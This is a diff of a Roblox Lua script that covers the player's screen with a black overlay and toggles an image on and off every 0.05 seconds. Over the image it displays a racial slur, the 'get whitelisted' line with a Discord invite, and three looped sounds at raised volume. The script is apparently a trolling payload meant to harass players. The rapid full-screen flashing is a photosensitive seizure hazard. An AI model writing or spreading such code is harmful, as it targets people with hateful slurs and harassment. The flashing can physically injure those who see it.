@@ -3,34 +3,81 @@ local playerGui = player:FindFirstChildOfClass("PlayerGui")
 
 -- Create a ScreenGui to hold the elements
 local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "FullScreenWhiteGui"
+screenGui.Name = "FlashingImageGui"
+screenGui.IgnoreGuiInset = true -- Prevent GUI from respecting the top bar inset
 screenGui.ResetOnSpawn = false -- Prevent GUI from disappearing on reset
 screenGui.Parent = playerGui
 
--- Create a Frame to cover the entire screen
+-- Create a Frame to cover the entire screen with a black background
 local frame = Instance.new("Frame")
 frame.Size = UDim2.new(1, 0, 1, 0)
 frame.Position = UDim2.new(0, 0, 0, 0)
-frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
 frame.Parent = screenGui
 
--- Create a TextLabel to display the message
+-- Create an ImageLabel for the flashing image
+local imageLabel = Instance.new("ImageLabel")
+imageLabel.Size = UDim2.new(1, 0, 1, 0)
+imageLabel.Position = UDim2.new(0, 0, 0, 0)
+imageLabel.Image = "rbxassetid://114427013717266" -- Use the correct decal ID
+imageLabel.BackgroundTransparency = 1
+imageLabel.Parent = frame
+
+-- Create a TextLabel to display the main message on top of the flashing image
 local textLabel = Instance.new("TextLabel")
-textLabel.Size = UDim2.new(1, 0, 1, 0)
-textLabel.Position = UDim2.new(0, 0, 0, 0)
-textLabel.Text = "You thought bitch nigga"
+textLabel.Size = UDim2.new(1, 0, 0.5, 0)
+textLabel.Position = UDim2.new(0, 0, 0.25, 0)
+textLabel.Text = "You thought bitch nigga 🤣"
 textLabel.Font = Enum.Font.GothamBold
 textLabel.TextScaled = true
-textLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
+textLabel.TextColor3 = Color3.fromRGB(255, 255, 255) -- Set text color to white
 textLabel.BackgroundTransparency = 1
 textLabel.Parent = frame
 
--- Add the sound
-local sound = Instance.new("Sound")
-sound.SoundId = "rbxassetid://602163388"
-sound.Volume = 1 -- Set the volume to the maximum allowed value
-sound.Looped = true -- Enable looping
-sound.Parent = screenGui
+-- Create a smaller TextLabel to display the secondary message
+local subTextLabel = Instance.new("TextLabel")
+subTextLabel.Size = UDim2.new(1, 0, 0.2, 0)
+subTextLabel.Position = UDim2.new(0, 0, 0.7, 0)
+subTextLabel.Text = "get whitelisted .gg/uCSrk6BV6r"
+subTextLabel.Font = Enum.Font.Gotham
+subTextLabel.TextScaled = true
+subTextLabel.TextColor3 = Color3.fromRGB(255, 255, 255) -- Set text color to white
+subTextLabel.BackgroundTransparency = 1
+subTextLabel.Parent = frame
 
--- Play the sound
-sound:Play()
+-- Add the first sound
+local sound1 = Instance.new("Sound")
+sound1.SoundId = "rbxassetid://602163388"
+sound1.Volume = 10 -- Increase the volume
+sound1.Looped = true -- Enable looping
+sound1.Parent = screenGui
+
+-- Add the second sound
+local sound2 = Instance.new("Sound")
+sound2.SoundId = "rbxassetid://343430735"
+sound2.Volume = 10 -- Increase the volume
+sound2.Looped = true -- Enable looping
+sound2.Parent = screenGui
+
+-- Add the third sound
+local sound3 = Instance.new("Sound")
+sound3.SoundId = "rbxassetid://6567183465"
+sound3.Volume = 10 -- Increase the volume
+sound3.Looped = true -- Enable looping
+sound3.Parent = screenGui
+
+-- Play the sounds
+sound1:Play()
+sound2:Play()
+sound3:Play()
+
+-- Function to flash the image
+local function flashImage()
+    while true do
+        imageLabel.Visible = not imageLabel.Visible
+        wait(0.05) -- Flash the image every 0.05 seconds (20 flashes per second)
+    end
+end
+
+-- Start flashing the image
+flashImage()
